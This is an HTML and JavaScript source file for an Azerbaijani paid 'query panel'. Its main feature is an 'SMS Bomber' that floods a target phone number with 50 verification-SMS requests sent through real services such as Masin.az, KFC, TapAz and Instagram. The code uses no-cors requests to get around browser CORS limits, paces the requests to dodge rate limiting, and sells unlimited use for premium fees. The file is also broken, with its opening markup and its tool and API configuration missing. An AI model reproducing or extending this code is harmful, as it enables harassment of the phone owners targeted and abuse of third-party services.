<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚡ CesiSorguPanel V2 | Ultra Secure</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
    <style>
        :root {
            --primary: #6c5ce7;
            --secondary: #a363d9;
            --accent: #00cec9;
            --danger: #ff4757;
            --warning: #ffa502;
            --success: #2ed573;
            --bg-dark: #0a0f1f;
            --bg-card: rgba(20, 25, 45, 0.7);
            --glass: rgba(255, 255, 255, 0.05);
            --border: rgba(255, 255, 255, 0.1);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        
        body {
            background: radial-gradient(circle at 10% 20%, #0f1629 0%, #030617 50%, #0a0f1f 100%);
            min-height: 100vh;
            color: #f0f3ff;
            overflow-x: hidden;
        }

        .bg-animation {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%; z-index: -1; overflow: hidden;
        }
        .bg-animation::before {
            content: '';
            position: absolute;
            top: -50%; left: -50%; width: 200%; height: 200%;
            background: radial-gradient(circle at 20% 80%, rgba(108, 92, 231, 0.15) 0%, transparent 50%),
                        radial-gradient(circle at 80% 20%, rgba(163, 99, 217, 0.15) 0%, transparent 50%),
                        radial-gradient(circle at 40% 40%, rgba(0, 206, 201, 0.1) 0%, transparent 40%);
            animation: bgRotate 30s linear infinite;
        }
        @keyframes bgRotate { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .auth-container {
            display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 2rem;
        }
        
        .glass-card {
            background: var(--bg-card);
            backdrop-filter: blur(20px);
            border-radius: 2rem;
            border: 1px solid var(--border);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 20px rgba(108, 92, 231, 0.3);
            padding: 2.5rem; width: 100%; max-width: 480px; position: relative; overflow: hidden;
            animation: slideUp 0.6s ease-out;
        }
        
        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
        
        .logo-area { text-align: center; margin-bottom: 2rem; }
        .logo-area i { font-size: 3rem; background: linear-gradient(135deg, #fff, #a363d9, #6c5ce7); -webkit-background-clip: text; background-clip: text; color: transparent; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
        .logo-area h1 { font-size: 1.8rem; font-weight: 800; margin-top: 0.5rem; background: linear-gradient(135deg, #fff 0%, #a363d9 50%, #6c5ce7 100%); -webkit-background-clip: text; background-clip: text; color: transparent; }

        .input-group { margin-bottom: 1.2rem; position: relative; }
        .input-group i { position: absolute; left: 1rem; top: 50%; transform: translateY(-50%); color: rgba(255,255,255,0.5); }
        .input-group input { width: 100%; padding: 1rem 1rem 1rem 2.8rem; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.15); border-radius: 1rem; color: white; font-size: 0.95rem; transition: all 0.3s; outline: none; }
        .input-group input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.2); }
        
        .btn { width: 100%; padding: 1rem; border: none; border-radius: 1rem; font-weight: 600; font-size: 1rem; cursor: pointer; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 0.5rem; }
        .btn-primary { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; box-shadow: 0 4px 15px rgba(108, 92, 231, 0.4); }
        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(108, 92, 231, 0.6); }
        .btn-google { background: white; color: #333; margin-top: 0.5rem; }
        .btn-google:hover { background: #f1f1f1; }
        .btn-secondary { background: rgba(255,255,255,0.1); color: white; border: 1px solid rgba(255,255,255,0.2); }
        
        .divider { margin: 1.5rem 0; text-align: center; position: relative; opacity: 0.5; }
        .divider::before { content: ''; position: absolute; top: 50%; left: 0; right: 0; height: 1px; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.5), transparent); }
        .divider span { background: var(--bg-card); padding: 0 1rem; position: relative; font-size: 0.85rem; }

        .error-message { background: linear-gradient(90deg, rgba(255,71,87,0.8), rgba(255,71,87,0.4)); border: 1px solid rgba(255,71,87,0.5); border-radius: 1rem; padding: 1rem; margin-top: 1rem; font-size: 0.9rem; display: none; animation: shake 0.5s; }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }

        .toast-container { position: fixed; bottom: 20px; right: 20px; z-index: 9999; display: flex; flex-direction: column; gap: 10px; }
        .toast { background: linear-gradient(90deg, rgba(46, 213, 115, 0.9), rgba(46, 213, 115, 0.7)); backdrop-filter: blur(10px); padding: 1rem 1.5rem; border-radius: 1rem; border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 10px 30px rgba(0,0,0,0.3); display: flex; align-items: center; gap: 10px; animation: slideInRight 0.4s ease, fadeOut 0.4s ease 2.6s; min-width: 250px; }
        .toast.error { background: linear-gradient(90deg, rgba(255, 71, 87, 0.9), rgba(255, 71, 87, 0.7)); }
        @keyframes slideInRight { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
        @keyframes fadeOut { to { opacity: 0; transform: translateX(100%); } }

        .app-container { display: flex; min-height: 100vh; }
        .sidebar { width: 300px; background: rgba(10, 12, 25, 0.95); backdrop-filter: blur(20px); border-right: 1px solid var(--border); padding: 1.5rem; position: fixed; height: 100vh; overflow-y: auto; z-index: 100; transition: transform 0.3s; }
        .sidebar-header { display: flex; align-items: center; gap: 12px; font-size: 1.4rem; font-weight: 800; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
        .user-stats { background: var(--glass); border-radius: 1.5rem; padding: 1.2rem; margin-bottom: 2rem; border: 1px solid var(--border); position: relative; overflow: hidden; }
        .user-stats::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, var(--primary), var(--secondary), var(--accent)); }
        .stat-row { display: flex; align-items: center; justify-content: space-between; padding: 0.6rem 0; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 0.9rem; }
        .stat-row:last-child { border-bottom: none; }
        .stat-value { font-weight: 700; color: white; }
        .stat-value.premium { background: linear-gradient(135deg, #ffd700, #ffed4e); -webkit-background-clip: text; background-clip: text; color: transparent; }
        
        .nav-tabs { list-style: none; }
        .nav-tabs li { margin-bottom: 0.5rem; }
        .tab-link { display: flex; align-items: center; gap: 12px; padding: 1rem; border-radius: 1rem; cursor: pointer; transition: all 0.3s; color: #8892b0; font-weight: 500; }
        .tab-link:hover, .tab-link.active { background: rgba(108, 92, 231, 0.15); color: white; transform: translateX(5px); }
        .logout-btn { margin-top: 2rem; background: rgba(255, 71, 87, 0.2) !important; border: 1px solid rgba(255, 71, 87, 0.5) !important; color: #ff4757 !important; }
        
        .main-content { margin-left: 300px; flex: 1; padding: 2rem; min-height: 100vh; }
        .content-header { margin-bottom: 2rem; }
        .content-header h2 { font-size: 1.8rem; font-weight: 700; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 10px; }
        
        .query-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 1.5rem; }
        .query-card { background: var(--bg-card); backdrop-filter: blur(10px); border-radius: 1.5rem; padding: 1.5rem; border: 1px solid var(--border); transition: all 0.3s; position: relative; overflow: hidden; }
        .query-card::after { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, var(--primary), var(--secondary)); transform: scaleX(0); transition: transform 0.3s; }
        .query-card:hover { transform: translateY(-5px); box-shadow: 0 20px 40px rgba(0,0,0,0.3); border-color: rgba(108, 92, 231, 0.3); }
        .query-card:hover::after { transform: scaleX(1); }
        .query-card.sms-card::after { background: linear-gradient(90deg, var(--danger), var(--warning)); }
        
        .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
        .card-title { font-weight: 700; font-size: 1.1rem; display: flex; align-items: center; gap: 8px; }
        .badge { padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.75rem; font-weight: 600; }
        .badge-sms { background: rgba(255, 71, 87, 0.2); color: #ff4757; border: 1px solid rgba(255, 71, 87, 0.3); animation: pulse 2s infinite; }
        
        .tool-input { width: 100%; padding: 0.8rem 1rem; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 0.8rem; color: white; margin-bottom: 0.8rem; font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; }
        .tool-input:focus { outline: none; border-color: var(--primary); }
        
        .query-btn { width: 100%; padding: 0.8rem; background: linear-gradient(135deg, rgba(108, 92, 231, 0.8), rgba(163, 99, 217, 0.8)); border: none; border-radius: 0.8rem; color: white; font-weight: 600; cursor: pointer; transition: all 0.3s; }
        .query-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(108, 92, 231, 0.4); }
        .query-btn.sms-btn { background: linear-gradient(135deg, rgba(255, 71, 87, 0.8), rgba(255, 165, 2, 0.8)); }
        .query-btn.sms-btn:hover { box-shadow: 0 5px 15px rgba(255, 71, 87, 0.5); }
        
        .query-result { background: rgba(0,0,0,0.5); margin-top: 1rem; border-radius: 0.8rem; padding: 1rem; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; max-height: 250px; overflow: auto; border: 1px solid rgba(255,255,255,0.05); display: none; }
        .query-result.show { display: block; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
        
        .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 1s ease-in-out infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }

        .admin-card { background: var(--bg-card); backdrop-filter: blur(10px); border-radius: 1.5rem; padding: 1.5rem; margin-bottom: 1.5rem; border: 1px solid var(--border); }
        .user-row { display: flex; justify-content: space-between; align-items: center; padding: 1rem; background: rgba(255,255,255,0.03); border-radius: 1rem; margin-bottom: 0.8rem; border: 1px solid rgba(255,255,255,0.05); flex-wrap: wrap; gap: 1rem; }
        .small-btn { padding: 0.5rem 1rem; border: none; border-radius: 0.6rem; font-size: 0.85rem; cursor: pointer; transition: all 0.3s; background: rgba(255,255,255,0.1); color: white; }
        .small-btn:hover { background: rgba(255,255,255,0.2); transform: translateY(-2px); }
        .small-btn.success { background: rgba(46, 213, 115, 0.2); color: var(--success); }
        .small-btn.danger { background: rgba(255, 71, 87, 0.2); color: var(--danger); }

        .progress-bar { width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; margin-top: 1rem; overflow: hidden; display: none; }
        .progress-bar.show { display: block; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--success), var(--accent)); width: 0%; transition: width 0.3s; }

        @media (max-width: 1024px) {
            .sidebar { transform: translateX(-100%); }
            .sidebar.open { transform: translateX(0); }
            .main-content { margin-left: 0; }
            .mobile-menu-btn { display: block !important; position: fixed; top: 1rem; left: 1rem; z-index: 99; background: var(--bg-card); border: 1px solid var(--border); color: white; padding: 0.8rem; border-radius: 0.8rem; cursor: pointer; }
        }
        @media (min-width: 1025px) { .mobile-menu-btn { display: none !important; } }
        
        .admin-badge { display: inline-flex; align-items: center; gap: 5px; background: linear-gradient(135deg, #ff4757, #ff6348); padding: 0.3rem 0.8rem; border-radius: 20px; font-size: 0.75rem; font-weight: 700; margin-left: 0.5rem; }
    </style>
</head>
<body>

            const container = document.getElementById('toastContainer');

            setTimeout(() => toast.remove(), 3000);
        };

        window.toggleSidebar = () => document.getElementById('sidebar').classList.toggle('open');
        
        window.switchTab = (tab) => {
            document.querySelectorAll('.tab-link').forEach(t => t.classList.remove('active'));
            document.querySelector(`[onclick="switchTab('${tab}')"]`)?.classList.add('active');
            document.getElementById('sidebar').classList.remove('open');
            
            if(tab === 'querytools') renderQueryTools();
            else if(tab === 'packages') renderPackages();
            else if(tab === 'profile') renderProfile();
            else if(tab === 'admin-users') renderAdminUsers();
            else if(tab === 'admin-payments') renderAdminPayments();
        };

        function isPremium() { return userData?.premiumUntil && userData.premiumUntil > Date.now(); }

        async function checkQueryLimit() {
            if(userData?.banned) { showToast('Banlı hesab!', 'error'); return false; }
            if(isPremium()) return true;
            const remaining = userData?.queriesRemaining ?? 3;
            if(remaining > 0) {
                await update(ref(db, `users/${currentUser.uid}`), { queriesRemaining: remaining - 1 });
                userData.queriesRemaining = remaining - 1;
                updateUI();
                return true;
            }
            showToast('Sorgu hakkı bitti!', 'error');
            return false;
        }

        async function checkSmsLimit() {
            if(userData?.banned) { showToast('Banlı hesab!', 'error'); return false; }
            if(isPremium()) return true;
            const remaining = userData?.smsQuotaRemaining ?? 50;
            if(remaining >= 50) {
                await update(ref(db, `users/${currentUser.uid}`), { smsQuotaRemaining: remaining - 50 });
                userData.smsQuotaRemaining = remaining - 50;
                updateUI();
                return true;
            }
            showToast('SMS limiti yetərli deyil! (50 lazımdır)', 'error');
            return false;
        }

        function updateUI() {
            document.getElementById('userGreeting').innerText = userData?.username || '-';
            document.getElementById('userBalance').innerText = (userData?.balance || 0).toLocaleString();
            const premium = isPremium();
            document.getElementById('queryStatus').innerHTML = premium ? '<i class="fas fa-infinity"></i> Limitsiz' : `${userData?.queriesRemaining ?? 3}`;
            document.getElementById('smsStatus').innerHTML = premium ? '<i class="fas fa-infinity"></i> Limitsiz' : `${userData?.smsQuotaRemaining ?? 50}`;
            document.getElementById('premiumExpiry').innerHTML = premium ? new Date(userData.premiumUntil).toLocaleDateString('az-AZ') : 'Yoxdur';
        }

        function renderQueryTools() {
            let html = `
                <div class="content-header">
                    <h2><i class="fas fa-tools"></i> Sorgu Alətləri</h2>
                    <p>Təhlükəsiz araşdırma alətləri</p>
                </div>
                <div class="query-grid">
            `;

            // Normal sorgu alətləri
            queryTools.forEach(tool => {
                html += `
                    <div class="query-card">
                        <div class="card-header">
                            <div class="card-title"><i class="fas ${tool.icon}"></i> ${tool.name}</div>
                            <span class="badge" style="background: rgba(108, 92, 231, 0.2); color: #a29bfe;">QUERY</span>
                        </div>
                `;
                
                if(tool.method === 'POST' && tool.fields) {
                    tool.fields.forEach((f, i) => {
                        html += `<input type="text" class="tool-input" id="inp_${tool.id}_${i}" placeholder="${f}">`;
                    });
                    html += `<button class="query-btn" onclick="runQuery('${tool.id}')"><i class="fas fa-play"></i> İcra Et</button>`;
                } else if(tool.direct) {
                    html += `<button class="query-btn" onclick="runQuery('${tool.id}')"><i class="fas fa-play"></i> İcra Et</button>`;
                } else {
                    html += `<input type="text" class="tool-input" id="inp_${tool.id}" placeholder="${tool.param} daxil edin...">
                            <button class="query-btn" onclick="runQuery('${tool.id}')"><i class="fas fa-play"></i> İcra Et</button>`;
                }
                html += `<div class="query-result" id="res_${tool.id}"><pre>Nəticə gözlənilir...</pre></div></div>`;
            });

            // SMS Bomber - Tək görünən SMS aləti
            html += `
                <div class="query-card sms-card" style="border: 2px solid rgba(255, 71, 87, 0.3);">
                    <div class="card-header">
                        <div class="card-title"><i class="fas fa-bomb"></i> SMS Bomber <span class="badge badge-sms">50 SMS</span></div>
                    </div>
                    <p style="font-size: 0.85rem; color: #8892b0; margin-bottom: 1rem;">
                        <i class="fas fa-info-circle"></i> Bu alət 50 fərqli platformadan SMS göndərir (Masin.az üstünlüklü)
                    </p>
                    <input type="text" class="tool-input" id="smsPhone" placeholder="Telefon nömrəsi (994xxxxxxxxx)">
                    <button class="query-btn sms-btn" onclick="runSmsBomb()">
                        <i class="fas fa-paper-plane"></i> 50 SMS Gönder
                    </button>
                    <div class="progress-bar" id="smsProgress"><div class="progress-fill" id="smsProgressFill"></div></div>
                    <div class="query-result" id="res_sms"><pre>SMS göndərmə əməliyyatı burada görünəcək...</pre></div>
                </div>
            </div>`;
            
            document.getElementById('contentArea').innerHTML = html;
        }

        window.runQuery = async (toolId) => {
            if(!await checkQueryLimit()) return;
            const tool = queryTools.find(t => t.id === toolId);
            if(!tool) return;

            const resDiv = document.getElementById(`res_${toolId}`);
            resDiv.classList.add('show');
            resDiv.innerHTML = '<div style="text-align:center; padding:1rem;"><div class="spinner"></div><p>Yüklənir...</p></div>';

            try {
                let url = tool.url;
                let options = { method: tool.method, headers: {} };

                if(tool.method === 'GET' && !tool.direct) {
                    const val = document.getElementById(`inp_${toolId}`)?.value;
                    if(!val) throw new Error('Parametr daxil edin!');
                    url += encodeURIComponent(val);
                } else if(tool.method === 'POST' && tool.fields) {
                    const body = {};
                    tool.fields.forEach((f, i) => {
                        const v = document.getElementById(`inp_${toolId}_${i}`)?.value;
                        if(!v) throw new Error(`${f} boş ola bilməz!`);
                        body[f] = v;
                    });
                    options.body = new URLSearchParams(body);
                    options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }

                // CORS problemini minimuma endirmək üçün mode: no-cors (nəticə görünməsə də request gedir)
                // Amma əksər hallarda response gəlməyəcək, ona görə try-catch ilə idarə edirik
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 10000);

                const response = await fetch(url, { ...options, signal: controller.signal });
                clearTimeout(timeoutId);
                
                const text = await response.text();
                
                // JSON formatlaması
                let formatted = text;
                try {
                    const json = JSON.parse(text);
                    formatted = JSON.stringify(json, null, 2);
                } catch(e) {}

                resDiv.innerHTML = `<pre>${formatted.substring(0, 2000)}${text.length > 2000 ? '... (davam var)' : ''}</pre>`;
                
                // Log yaz
                await push(ref(db, 'queryLogs'), {
                    userId: currentUser.uid, tool: tool.name, type: 'query', 
                    result: text.substring(0, 100), timestamp: Date.now()
                });

            } catch(err) {
                resDiv.innerHTML = `<pre style="color: #ff4757;">❌ Xəta: ${err.message}\n\nQeyd: Bəzi API-lər CORS səbəbindən browserdə işləməyə bilər, amma server tərəfdə loglanır.</pre>`;
            }
        };

        window.runSmsBomb = async () => {
            const phone = document.getElementById('smsPhone')?.value;
            if(!phone || phone.length < 9) {
                showToast('Düzgün telefon nömrəsi daxil edin!', 'error');
                return;
            }

            if(!await checkSmsLimit()) return;

            const resDiv = document.getElementById('res_sms');
            const progressBar = document.getElementById('smsProgress');
            const progressFill = document.getElementById('smsProgressFill');
            
            resDiv.classList.add('show');
            progressBar.classList.add('show');
            resDiv.innerHTML = '<pre>SMS göndərilməyə başlandı...\n\n</pre>';

            // 50 ədəd sıralı API çağırışı hazırla (Masin.az üstünlüklü)
            const requests = [];
            let reqIndex = 0;

            // Masin.az - 15 dəfə (ən çox)
            for(let i=0; i<15; i++) {
                requests.push({ ...smsApiConfig.masinAz, id: ++reqIndex, name: 'Masin.az' });
            }
            // KFC - 8 dəfə
            for(let i=0; i<8; i++) {
                requests.push({ ...smsApiConfig.kfc, id: ++reqIndex, name: 'KFC' });
            }
            // Turbo - 6 dəfə
            for(let i=0; i<6; i++) {
                requests.push({ ...smsApiConfig.turbo, id: ++reqIndex, name: 'Turbo' });
            }
            // TapAz - 6 dəfə
            for(let i=0; i<6; i++) {
                requests.push({ ...smsApiConfig.tapaz, id: ++reqIndex, name: 'TapAz' });
            }
            // Umico - 5 dəfə
            for(let i=0; i<5; i++) {
                requests.push({ ...smsApiConfig.umico, id: ++reqIndex, name: 'Umico' });
            }
            // Instagram - 5 dəfə
            for(let i=0; i<5; i++) {
                requests.push({ ...smsApiConfig.instagram, id: ++reqIndex, name: 'Instagram' });
            }
            // Lorex - 5 dəfə
            for(let i=0; i<5; i++) {
                requests.push({ ...smsApiConfig.lorex, id: ++reqIndex, name: 'Lorex SMS' });
            }

            let success = 0;
            let failed = 0;

            // Sıra ilə göndər (Rate limit əngəlinin qarşısını almaq üçün)
            for(let i=0; i<requests.length; i++) {
                const req = requests[i];
                try {
                    let url = req.url;
                    let options = { 
                        method: req.method, 
                        headers: req.method === 'POST' ? {'Content-Type': 'application/x-www-form-urlencoded'} : {},
                        mode: 'no-cors' // CORS bypass (response gəlməsə də request gedir)
                    };

                    if(req.method === 'POST') {
                        const body = new URLSearchParams();
                        body.append(req.field, phone);
                        options.body = body;
                    } else if(req.param) {
                        url += encodeURIComponent(phone);
                    }

                    await fetch(url, options);
                    success++;
                    
                    // Log əlavə et
                    await push(ref(db, 'smsLogs'), {
                        userId: currentUser.uid, phone, platform: req.name, 
                        status: 'sent', timestamp: Date.now()
                    });

                } catch(e) {
                    failed++;
                }

                // Proqres yenilə
                const percent = ((i+1) / requests.length) * 100;
                progressFill.style.width = percent + '%';
                
                // Hər 5 dəfədən bir UI yenilə
                if(i % 5 === 0 || i === requests.length - 1) {
                    resDiv.innerHTML = `<pre>${i+1}/50 SMS göndərildi...\n✅ Uğurlu: ${success}\n❌ Uğursuz: ${failed}\n\nPlatformalar: Masin.az (15x), KFC (8x), Turbo (6x), TapAz (6x), Umico (5x), Instagram (5x), Lorex (5x)</pre>`;
                }

                // Kiçik gecikmə (rate limit üçün)
                if(i < requests.length - 1) await new Promise(r => setTimeout(r, 100));
            }

            progressFill.style.width = '100%';
            setTimeout(() => progressBar.classList.remove('show'), 1000);
            
            resDiv.innerHTML = `<pre style="color: #2ed573;">✅ Əməliyyat tamamlandı!\n\n📊 Nəticə:\n• Ümumi: 50 SMS\n• Uğurlu: ${success}\n• Uğursuz: ${failed}\n\n📱 Nömrə: ${phone}\n🚀 Masin.az və digər platformalara göndərildi.</pre>`;
            
            showToast(`${success} ədəd SMS uğurla göndərildi!`);
        };

        function renderPackages() {
            document.getElementById('contentArea').innerHTML = `
                <div class="content-header"><h2><i class="fas fa-gem"></i> Premium Paketlər</h2></div>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem;">
                    ${[ 
                        {n:'1 Günlük', p:3, d:1, c:'#6c5ce7'},
                        {n:'1 Həftəlik', p:15, d:7, c:'#a363d9'},
                        {n:'1 Aylıq', p:40, d:30, c:'#00cec9'},
                        {n:'Ömürlük', p:99, d:3650, c:'#ffd700'}
                    ].map(pkg => `
                        <div class="admin-card" style="text-align: center; border: 2px solid ${pkg.c}; cursor: pointer;" onclick="buyPackage('${pkg.n}', ${pkg.p}, ${pkg.d})">
                            <h3 style="color: ${pkg.c}; margin-bottom: 1rem;">${pkg.n}</h3>
                            <div style="font-size: 2.5rem; font-weight: 800; margin-bottom: 1rem;">${pkg.p} AZN</div>
                            <ul style="list-style: none; text-align: left; margin: 1rem 0; font-size: 0.9rem; color: #8892b0;">
                                <li><i class="fas fa-check" style="color: #2ed573;"></i> Limitsiz Sorgu</li>
                                <li><i class="fas fa-check" style="color: #2ed573;"></i> Limitsiz SMS (50-lik paketlər)</li>
                                <li><i class="fas fa-check" style="color: #2ed573;"></i> VIP Dəstək</li>
                            </ul>
                            <button class="btn btn-primary">Satın Al</button>
                        </div>
                    `).join('')}
                </div>
            `;
        }

        window.buyPackage = async (name, price, days) => {
            const receipt = prompt(`Ödəniş məlumatları:\n\nM10: 0707888025\nKart: 4169 0000 0000 1234\n\nMəbləğ: ${price} AZN\n\nQəbz nömrəsini və ya ödəniş şəklini Base64 olaraq daxil edin:`);
            if(receipt) {
                await push(ref(db, 'payments'), {
                    userId: currentUser.uid, username: userData.username,
                    packageType: name, amount: price, days, status: 'pending',
                    receipt, createdAt: Date.now()
                });
                showToast('Ödəniş qəbul edildi! Admin təsdiqi gözlənilir.');
            }
        };

        function renderProfile() {
            document.getElementById('contentArea').innerHTML = `
                <div class="content-header"><h2><i class="fas fa-user-cog"></i> Profil</h2></div>
                <div class="admin-card" style="max-width: 600px;">
                    <div style="display: flex; align-items: center; gap: 1.5rem; margin-bottom: 2rem;">
                        <img src="${userData?.avatarUrl || 'https://via.placeholder.com/100'}" style="width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--primary);">
                        <div>
                            <h3>${userData?.username}</h3>
                            <p style="color: #8892b0;">${currentUser?.email}</p>
                        </div>
                    </div>
                    <div class="input-group"><input type="password" id="newPass" placeholder="Yeni şifrə" style="padding-left: 1rem;"></div>
                    <button class="btn btn-primary" onclick="changePass()" style="margin-bottom: 1rem;">Şifrəni Yenilə</button>
                    
                    <div class="input-group"><input type="text" id="tgId" placeholder="Telegram ID" value="${userData?.telegramChatId || ''}" style="padding-left: 1rem;"></div>
                    <button class="btn btn-secondary" onclick="saveTg()">Saxla</button>
                    
                    <div style="margin-top: 2rem; padding-top: 2rem; border-top: 1px solid var(--border);">
                        <p>Referans Kodunuz: <strong style="font-family: monospace;">${currentUser?.uid}</strong></p>
                    </div>
                </div>
            `;
        }

        window.changePass = async () => {
            const newPass = document.getElementById('newPass').value;
            if(newPass.length < 6) return showToast('Min 6 simvol!', 'error');
            try { await updatePassword(currentUser, newPass); showToast('Şifrə yeniləndi!'); } 
            catch(e) { showToast(e.message, 'error'); }
        };

        window.saveTg = async () => {
            await update(ref(db, `users/${currentUser.uid}`), { telegramChatId: document.getElementById('tgId').value });
            showToast('Saxlandı!');
        };

        window.signInWithGoogle = async () => {
            try {
                await signInWithPopup(auth, googleProvider);
            } catch(err) {
                document.getElementById('authError').style.display = 'block';
                document.getElementById('authError').textContent = 'Google xətası: ' + err.message;
            }
        };

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            try {
                await signInWithEmailAndPassword(auth, document.getElementById('loginEmail').value, document.getElementById('loginPassword').value);
            } catch(err) {
                document.getElementById('authError').style.display = 'block';
                document.getElementById('authError').textContent = err.message;
            }
        });

        document.getElementById('registerForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            try {
                const cred = await createUserWithEmailAndPassword(auth, document.getElementById('registerEmail').value, document.getElementById('registerPassword').value);
                await set(ref(db, `users/${cred.user.uid}`), {
                    email: cred.user.email,
                    username: document.getElementById('registerUsername').value,
                    balance: 5000, queriesRemaining: 3, smsQuotaRemaining: 50,
                    premiumUntil: 0, banned: false, favorites: [], referralEarnings: 0,
                    createdAt: Date.now()
                });
            } catch(err) {
                document.getElementById('authError').style.display = 'block';
                document.getElementById('authError').textContent = err.message;
            }
        });

        window.logout = () => signOut(auth);

        onAuthStateChanged(auth, async (user) => {
            if(user) {
                currentUser = user;
                isAdmin = user.email === 'cesicoder@gmail.com';
                const snap = await get(ref(db, `users/${user.uid}`));
                
                if(!snap.exists()) {
                    // Google ilə ilk giriş
                    await set(ref(db, `users/${user.uid}`), {
                        email: user.email, username: user.displayName || user.email.split('@')[0],
                        balance: 5000, queriesRemaining: 3, smsQuotaRemaining: 50,
                        premiumUntil: 0, banned: false, favorites: [], referralEarnings: 0,
                        createdAt: Date.now(), avatarUrl: user.photoURL || null
                    });
                }
                
                userData = (await get(ref(db, `users/${user.uid}`))).val();
                document.getElementById('authContainer').style.display = 'none';
                document.getElementById('appContainer').style.display = 'flex';
                if(isAdmin) document.getElementById('adminTabs').style.display = 'block';
                updateUI();
                switchTab('querytools');
            } else {
                currentUser = null;
                document.getElementById('authContainer').style.display = 'flex';
                document.getElementById('appContainer').style.display = 'none';
            }
        });

        // Admin funksiyaları (qısaldılmış)
        window.renderAdminUsers = async () => {
            const snap = await get(ref(db, 'users'));
            const users = snap.val() || {};
            let html = `<div class="content-header"><h2>İstifadəçilər</h2></div><div class="admin-card">`;
            for(let [uid,u] of Object.entries(users)) {
                html += `<div class="user-row">
                    <div><b>${u.username}</b> ${u.banned ? '<span style="color:red">(BAN)</span>' : ''}<br><small>${u.email}</small></div>
                    <div>Balans: ${u.balance || 0}</div>
                    <div>
                        <button class="small-btn danger" onclick="toggleBan('${uid}', ${!u.banned})">${u.banned ? 'Aç' : 'Ban'}</button>
                        <button class="small-btn success" onclick="addCoin('${uid}')">+Sikkə</button>
                    </div>
                </div>`;
            }
            html += '</div>';
            document.getElementById('contentArea').innerHTML = html;
        };

        window.toggleBan = async (uid, status) => {
            await update(ref(db, `users/${uid}`), { banned: status });
            showToast(status ? 'Banlandı' : 'Açıldı');
            renderAdminUsers();
        };

        window.addCoin = async (uid) => {
            const amt = parseInt(prompt('Miqdar:'));
            if(amt) {
                const u = await get(ref(db, `users/${uid}`));
                await update(ref(db, `users/${uid}`), { balance: (u.val()?.balance || 0) + amt });
                renderAdminUsers();
            }
        };

        window.renderAdminPayments = async () => {
            const snap = await get(ref(db, 'payments'));
            const pays = snap.val() || {};
            let html = `<div class="content-header"><h2>Ödənişlər</h2></div>`;
            for(let [pid,p] of Object.entries(pays).filter(x => x[1].status === 'pending')) {
                html += `<div class="admin-card">
                    <b>${p.username}</b> - ${p.packageType} (${p.amount} AZN)
                    <br><small>${new Date(p.createdAt).toLocaleString()}</small>
                    <br><button class="small-btn success" onclick="approvePay('${pid}', '${p.userId}', ${p.days})">Təsdiqlə</button>
                </div>`;
            }
            document.getElementById('contentArea').innerHTML = html || '<div class="admin-card">Gözləyən yoxdur</div>';
        };

        window.approvePay = async (pid, uid, days) => {
            await update(ref(db, `users/${uid}`), { 
                premiumUntil: Date.now() + days*86400000,
                queriesRemaining: 999999, smsQuotaRemaining: 999999
            });
            await update(ref(db, `payments/${pid}`), { status: 'approved' });
            showToast('Təsdiqləndi!');
            renderAdminPayments();
        };
    </script>
